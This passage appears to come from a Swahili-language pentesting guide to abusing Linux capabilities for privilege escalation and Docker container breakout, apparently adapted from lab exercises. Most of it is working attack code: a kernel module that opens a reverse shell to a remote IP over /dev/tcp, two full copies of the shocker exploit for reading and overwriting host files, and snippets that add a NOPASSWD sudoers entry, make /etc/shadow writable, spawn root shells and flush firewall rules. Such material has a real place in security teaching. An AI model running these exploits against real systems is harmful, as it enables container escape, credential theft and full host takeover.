km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Mfano wa 2 wenye binary**

Katika mfano ufuatao binary **`kmod`** ina capability hii.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Ambayo inamaanisha kuwa inawezekana kutumia amri **`insmod`** kuingiza kernel module. Fuata mfano ulio hapa chini ili kupata **reverse shell** kwa kutumia vibaya privilege hii.

**Mfano wenye mazingira (Docker breakout)**

Unaweza kuangalia capabilities zilizowezeshwa ndani ya Docker container kwa kutumia:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Katika output ya awali unaweza kuona kuwa capability ya **SYS_MODULE** imewezeshwa.<sup>[[14]](#references)</sup>

**Unda** **kernel module** itakayoendesha reverse shell pamoja na **Makefile** ya **compile** yake:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Nafasi tupu kabla ya kila neno la make kwenye Makefile **lazima iwe tab, si spaces**!

Tekeleza `make` ili kuikompile.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Hatimaye, anzisha `nc` ndani ya shell na **load module** kutoka kwenye shell nyingine, kisha utapata shell katika mchakato wa nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Msimbo wa technique hii ulinakiliwa kutoka kwenye maabara ya "Abusing SYS_MODULE Capability" ya** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Mfano mwingine wa technique hii unaweza kupatikana kwenye [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) huwezesha process **kupita permissions za kusoma files na za kusoma na kutekeleza directories**. Matumizi yake makuu ni kwa madhumuni ya kutafuta au kusoma files. Hata hivyo, pia huruhusu process kutumia function ya `open_by_handle_at(2)`, ambayo inaweza kufikia file yoyote, zikiwemo zilizo nje ya mount namespace ya process. Handle inayotumika katika `open_by_handle_at(2)` inapaswa kuwa identifier isiyo wazi inayopatikana kupitia `name_to_handle_at(2)`, lakini inaweza kujumuisha taarifa nyeti kama inode numbers ambazo zinaweza kufanyiwa tampering. Uwezekano wa kutumia vibaya capability hii, hasa katika muktadha wa Docker containers, ulionyeshwa na Sebastian Krahmer kupitia shocker exploit, kama ilivyochambuliwa [hapa](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)</sup>
**Hii inamaanisha kuwa unaweza kupita ukaguzi wa permissions za kusoma files na ukaguzi wa permissions za kusoma/kutekeleza directories**.<sup>[[14]](#references)</sup>

**Mfano kwa binary**

Binary inaweza kusoma files zinazofikika katika namespaces zake. Kwa hivyo, ikiwa file kama `tar` ina capability hii, inaweza kusoma shadow file:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Mfano wa binary2**

Katika hali hii, tuchukulie kuwa binary ya **`python`** ina capability hii. Ili kuorodhesha faili za root, unaweza kufanya:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Na ili kusoma faili unaweza kufanya:
```python
print(open("/etc/shadow", "r").read())
```
**Mfano katika Mazingira (Docker breakout)**

Unaweza kuangalia capabilities zilizowezeshwa ndani ya Docker container kwa kutumia `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Ndani ya matokeo yaliyotangulia unaweza kuona kwamba capability ya **DAC_READ_SEARCH** imewezeshwa. Hii hupita ukaguzi wa DAC wa kusoma/kutafuta na kuruhusu `open_by_handle_at(2)`; si capability ya process-debugging yenyewe.<sup>[[14]](#references)</sup>

Unaweza kujifunza jinsi exploit ifuatayo inavyofanya kazi kwenye [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), lakini kwa ufupi, **CAP_DAC_READ_SEARCH** inaruhusu kupitia mfumo wa faili bila ukaguzi wa ruhusa na inaruhusu `open_by_handle_at(2)`; hii inaweza kufichua faili zilizofunguliwa na processes nyingine wakati namespaces na mounts zinazohusika zinaweza kufikiwa.<sup>[[13]](#references)[[14]](#references)</sup>

Exploit ya awali inayotumia vibaya ruhusa hizi kusoma faili kutoka kwa host inaweza kupatikana hapa: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); ifuatayo ni **toleo lililorekebishwa linalokuruhusu kupitisha faili ya kusoma kama argument ya kwanza na kuandika matokeo kwenye faili**.<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> exploit inahitaji kupata pointer ya kitu kilichomountiwa kwenye host. exploit ya awali ilitumia file `/.dockerinit`, na toleo hili lililorekebishwa linatumia `/etc/hostname`. Ikiwa exploit haifanyi kazi, huenda ukahitaji kuweka file tofauti. Ili kupata file iliyomountiwa kwenye host, tekeleza tu mount command:

![CAP SYS MODULE - CAP DAC READ SEARCH: exploit inahitaji kupata pointer ya kitu kilichomountiwa kwenye host. exploit ya awali ilitumia file /.dockerinit, na toleo hili lililorekebishwa linatumia...](<../../images/image (407) (1).png>)

**Code ya technique hii ilikopiwa kutoka kwenye maabara ya "Abusing DAC_READ_SEARCH Capability" ya** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Capability hii hupita ukaguzi wa ruhusa za kusoma, kuandika na kutekeleza files**.<sup>[[14]](#references)</sup>

Tafuta files zinazoweza kusomeka au kuandikwa kupitia uanachama katika privileged group; targets zinazofaa hutegemea ownership ya target na mode bits zake.<sup>[[14]](#references)</sup>

**Mfano wenye binary**

Katika mfano huu vim ina capability hii, kwa hiyo unaweza kurekebisha file yoyote kama _passwd_, _sudoers_ au _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Mfano wenye binary 2**

Katika mfano huu, binary ya **`python`** itakuwa na capability hii. Unaweza kutumia python kubatilisha faili lolote:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Mfano wenye environment + CAP_DAC_READ_SEARCH (Docker breakout)**

Thibitisha `CAP_DAC_OVERRIDE` kwa `capsh --print` kama ilivyoonyeshwa katika mfano wa awali wa environment wa `CAP_DAC_READ_SEARCH`.<sup>[[14]](#references)[[26]](#references)</sup>

Kwanza soma sehemu iliyotangulia inayozungumzia [**abuses DAC_READ_SEARCH capability to read arbitrary files**](linux-capabilities.md#cap_dac_read_search) za host na **compile** exploit.\
Kisha, **compile version ifuatayo ya shocker exploit** itakayokuruhusu **kuandika arbitrary files** ndani ya filesystem ya host:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Ili **kutoka** kwenye docker container, unaweza **download** mafaili `/etc/shadow` na `/etc/passwd` kutoka kwa host, **add** **new user** ndani yake, na kutumia **`shocker_write`** kuyaandika upya. Kisha, **access** kupitia **ssh**.

**Code ya technique hii ilinakiliwa kutoka kwenye laboratory ya "Abusing DAC_OVERRIDE Capability" ya** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Capability hii inaruhusu process kubadilisha ownership ya mafaili**.<sup>[[14]](#references)</sup>

**Mfano wenye binary**

Tuchukulie kwamba binary ya **`python`** ina capability hii; unaweza kubadilisha owner wa faili kama vile **`shadow`**, kisha kutumia access iliyopatikana kuirekebisha iwapo permissions nyingine zinaruhusu:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Au kwa **binary** ya **`ruby`** yenye uwezo huu:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Capability hii hupita ukaguzi wa umiliki kwa shughuli nyingi za faili, ikiwemo kubadilisha permissions**.<sup>[[14]](#references)</sup>

**Mfano wa binary**

Ikiwa python ina capability hii, unaweza kurekebisha permissions za shadow file, **kubadilisha nenosiri la root**, na kufanya escalate privileges:
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**Uwezo huu huruhusu process kubadilisha user ID yake inayotumika, kulingana na sheria za credentials na capabilities zinazotekelezwa na kernel**.<sup>[[14]](#references)</sup>

**Mfano na binary**

Ikiwa python ina **capability** hii, unaweza kuitumia vibaya kwa urahisi sana ili kuongeza privileges hadi root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Njia nyingine:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Uwezo huu huruhusu mchakato kubadilisha group ID yake inayotumika, kwa kuzingatia sheria za credentials na capabilities zinazotekelezwa na kernel**.<sup>[[14]](#references)</sup>

Kuna faili nyingi unazoweza **kuandika upya ili kuongeza privileges,** [**unaweza kupata mawazo hapa**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Mfano wenye binary**

Katika hali hii unapaswa kutafuta faili zinazovutia ambazo group inaweza kusoma kwa sababu unaweza ku-impersonate group yoyote:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Baada ya kupata faili unayoweza kuitumia vibaya (kwa kuisoma au kuiandika) ili kuongeza privileges, unaweza **kupata shell inayojifanya kuwa group inayohusika** kwa:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Katika hali hii, group shadow iliigwa, hivyo unaweza kusoma faili `/etc/shadow`:
```bash
cat /etc/shadow
```
### Mnyororo wa pamoja: CAP_SETGID + CAP_CHOWN

Wakati capabilities zote mbili zinapatikana katika helper moja, mnyororo wa kivitendo ni:

1. Badilisha EGID kuwa `shadow` (au group nyingine yenye privileged).
2. Tumia `chown` kwenye `/etc/shadow` kuweka UID yako huku ukiendeleza group `shadow`.
3. Soma hash inayolengwa na uifanye crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Hii huepusha hitaji la kuwa na root kamili moja kwa moja, na mara nyingi inatosha kufanya pivot kupitia credential reuse.

Ikiwa **docker** imesakinishwa, unaweza **impersonate** **docker group** na kuitumia vibaya kuwasiliana na [**docker socket** na kuongeza privileges](#writable-docker-socket).

## CAP_SETFCAP

**Uwezo huu huruhusu process kuweka file capabilities**.<sup>[[14]](#references)</sup>

**Mfano wa binary**

Ikiwa python ina **capability** hii, unaweza kuitumia vibaya kwa urahisi sana ili kuongeza privileges hadi root:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Seti ya capability ya faili iliyoandikwa upya hubadilisha seti ya awali; ikiwa helper itaendeshwa baadaye ikiwa na capabilities mpya pekee, huenda isibakie tena na `CAP_SETFCAP` ya kusasisha faili nyingine.<sup>[[14]](#references)[[25]](#references)</sup>

Mara tu unapokuwa na [SETUID capability](linux-capabilities.md#cap_setuid), unaweza kwenda kwenye sehemu yake ili kuona jinsi ya kufanya privilege escalation.

**Mfano wa environment (Docker breakout)**

Seti ya capabilities chaguo-msingi iliyoandikwa kwenye nyaraka za Docker inajumuisha **CAP_SETFCAP**, lakini seti halisi hutegemea runtime configuration.<sup>[[19]](#references)</sup>
Unaweza kukagua process capabilities kwa:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Uwezo huu unaruhusu kuandika capabilities za faili, lakini peke yake hauipi process ya sasa capabilities hizo wala haupiti sheria za faili, bounding-set, na namespace zinazotumika faili linapotekelezwa.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
Uwezo unaoruhusiwa wa file umewekewa mipaka na capability bounding set ya process, na effective bit ya file hudhibiti ikiwa set yake ya capabilities zinazoruhusiwa itaongezwa kwenye effective set ya process. Ndiyo maana kuongeza capabilities kwenye file hakufanyi kila capability iliyoombwa iweze kutumika kiotomatiki wakati wa execution.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) hutoa operations kadhaa nyeti, zikiwemo access ya `/dev/mem`, `/dev/kmem` au `/proc/kcore`, kurekebisha `mmap_min_addr`, access ya system calls za `ioperm(2)` na `iopl(2)`, pamoja na disk commands mbalimbali. `FIBMAP ioctl(2)` pia huwezeshwa kupitia capability hii, jambo ambalo limesababisha matatizo [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Kulingana na man page, hii pia humruhusu mwenye capability kufanya operations mbalimbali maalum za device kwenye devices nyingine.<sup>[[14]](#references)</sup>

Hii inaweza kuwa muhimu kwa **privilege escalation** na **Docker breakout**.<sup>[[14]](#references)</sup>

## CAP_KILL

**Capability hii hupita ukaguzi wa permissions wa kutuma signals kwenye processes katika hali zilizobainishwa na kernel**.<sup>[[14]](#references)</sup>

**Mfano wa binary**

Tuchukulie kuwa binary ya **`python`** ina capability hii. Ikiwa ungeweza **pia kurekebisha service au socket configuration** file (au file yoyote ya configuration inayohusiana na service), ungeweza kuiwekea backdoor, kisha kuua process inayohusiana na service hiyo na kusubiri file mpya ya configuration itekelezwe pamoja na backdoor yako.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

Ikiwa una capabilities za `kill` na kuna **node program inayoendeshwa kama root** (au kama mtumiaji mwingine), huenda ukaweza **kuitumia** kutuma **signal SIGUSR1**, na kuifanya **ifungue node debugger** ambayo unaweza kuunganisha.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Uwezo huu unaruhusu ku-bind kwenye Internet ports zilizo chini ya 1024.** Haupeani moja kwa moja privilege escalation pana zaidi.<sup>[[14]](#references)</sup>

**Mfano kwa binary**

Ikiwa **`python`** ina capability hii, itaweza kusikiliza kwenye port yoyote na hata ku-connect kutoka humo kwenda kwenye port nyingine yoyote (baadhi ya services huhitaji connections kutoka kwenye ports zenye privileges maalum)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) inaruhusu processes **kuunda RAW na PACKET sockets**, na kuyawezesha kutengeneza na kutuma network packets za kiholela. Hili linaweza kusababisha security risks katika mazingira ya containerized, kama packet spoofing, traffic injection, na kupita network access controls. Malicious actors wanaweza kutumia hili kuingilia container routing au kuhatarisha host network security, hasa bila firewall protections zinazotosha. Zaidi ya hayo, **CAP_NET_RAW** inasaidia operations kama ping kupitia RAW ICMP requests.<sup>[[14]](#references)</sup>

**Hili linaweza kuwezesha packet capture kwa kutumia socket interface inayofaa.** Halipeani moja kwa moja privilege escalation pana zaidi.<sup>[[14]](#references)</sup>

**Mfano wenye binary**

Ikiwa binary **`tcpdump`** ina capability hii, utaweza kuitumia kunasa network information.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Ikiwa **environment** inatoa capability hii, **`tcpdump`** inaweza pia kuitumia kunusa traffic.<sup>[[14]](#references)</sup>

**Mfano wa binary 2**

Mfano ufuatao ni code ya **`python2`** inayoweza kuwa muhimu kwa ku-intercept traffic ya interface ya "**lo**" (**localhost**). Code hiyo imetoka kwenye lab "_The Basics: CAP-NET_BIND + NET_RAW_" kutoka [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) humpa mwenye uwezo huo nguvu ya **kubadilisha mipangilio ya mtandao**, ikijumuisha mipangilio ya firewall, routing tables, ruhusa za socket, na mipangilio ya network interface ndani ya network namespaces zilizo wazi. Pia huwezesha kuwasha **promiscuous mode** kwenye network interfaces, hivyo kuruhusu packet sniffing katika namespaces.<sup>[[14]](#references)</sup>

**Mfano wa binary**

Tuchukulie kuwa **python binary** ina capabilities hizi.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Uwezo huu unaruhusu kurekebisha inode flags kama vile immutable na append-only. Hauleti moja kwa moja privilege escalation pana zaidi.**<sup>[[14]](#references)</sup>

